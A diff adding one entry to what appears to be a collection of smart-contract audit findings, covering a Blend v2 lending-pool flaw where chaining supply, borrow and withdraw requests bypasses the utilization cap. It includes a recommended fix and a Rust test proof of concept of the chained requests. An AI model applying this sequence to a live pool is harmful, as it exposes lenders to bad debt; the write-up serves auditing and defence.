@@ -2708,3 +2708,88 @@ library Multicall {
 ```
 
 </details>
+
+## 30.[Medium] Attackers can maliciously inflate total_supply temporarily to exceed utilization rate limit and push the pool towards 100% util rate, potentially causing a loss of lender funds
+
+### Utilization Cap Bypass
+
+- Summary: Blend pools enforce a utilization rate limit to protect lenders, but this check is flawed because it only occurs inside `apply_borrow`, allowing attackers to bypass it by chaining actions in a single transaction (`apply_supply → apply_borrow → apply_withdraw`). This temporarily inflates `total_supply` before the borrow, passes the utilization check, and then withdraws the extra supply—leaving the loan active even if the pool exceeds its utilization cap. As a result, malicious users can illegally push the pool toward 100% utilization, increasing the risk of bad debt and lender losses, especially during volatile market conditions.
+
+- Impact & Recommendation: Move reserve.require_utilization_below_max(e) from apply_borrow to validate_submit which is the function that is called when the built transaction ends.
+  <br> 🐬: [Source](https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification#m-14-attackers-can-maliciously-inflate-total_supply-temporarily-to-exceed-utilization-rate-limit-and-push-the-pool-towards-100-util-rate-potentially-causing-a-loss-of-lender-funds) & [Report](https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification)
+
+<details><summary>POC</summary>
+
+```
+#[test]
+fn test_build_actions_from_request_borrow_errors_over_max_util() {
+    let e = Env::default();
+    e.mock_all_auths();
+
+    let bombadil = Address::generate(&e);
+    let samwise = Address::generate(&e);
+    let pool = testutils::create_pool(&e);
+
+    let (underlying, _) = testutils::create_token_contract(&e, &bombadil);
+    let (mut reserve_config, mut reserve_data) = testutils::default_reserve_meta();
+    reserve_config.max_util = 0_9000000;
+    reserve_data.b_supply = 100_0000000;
+    reserve_data.d_supply = 89_0000000;
+    testutils::create_reserve(&e, &pool, &underlying, &reserve_config, &reserve_data);
+
+    e.ledger().set(LedgerInfo {
+        timestamp: 600,
+        protocol_version: 22,
+        sequence_number: 1234,
+        network_id: Default::default(),
+        base_reserve: 10,
+        min_temp_entry_ttl: 10,
+        min_persistent_entry_ttl: 10,
+        max_entry_ttl: 3110400,
+    });
+
+    let pool_config = PoolConfig {
+        oracle: Address::generate(&e),
+        min_collateral: 1_0000000,
+        bstop_rate: 0_2000000,
+        status: 0,
+        max_positions: 2,
+    };
+
+    let user_positions = Positions {
+        liabilities: map![&e],
+        collateral: map![&e, (0, 20_0000000)],
+        supply: map![&e],
+    };
+
+    e.as_contract(&pool, || {
+        storage::set_pool_config(&e, &pool_config);
+        storage::set_user_positions(&e, &samwise, &user_positions);
+
+        let mut pool = Pool::load(&e);
+        let requests = vec![
+            &e,
+            Request {
+                request_type: RequestType::Supply as u32,
+                address: underlying.clone(),
+                amount: 10_1234567,
+            },
+            Request {
+                request_type: RequestType::Borrow as u32,
+                address: underlying.clone(),
+                amount: 2_0000000,
+            },
+            Request {
+                request_type: RequestType::Withdraw as u32,
+                address: underlying.clone(),
+                amount: 10_1234567,
+            }
+        ];
+        let mut user = User::load(&e, &samwise);
+        build_actions_from_request(&e, &mut pool, &mut user, requests);
+    });
+}
+
+```
+
+</details>
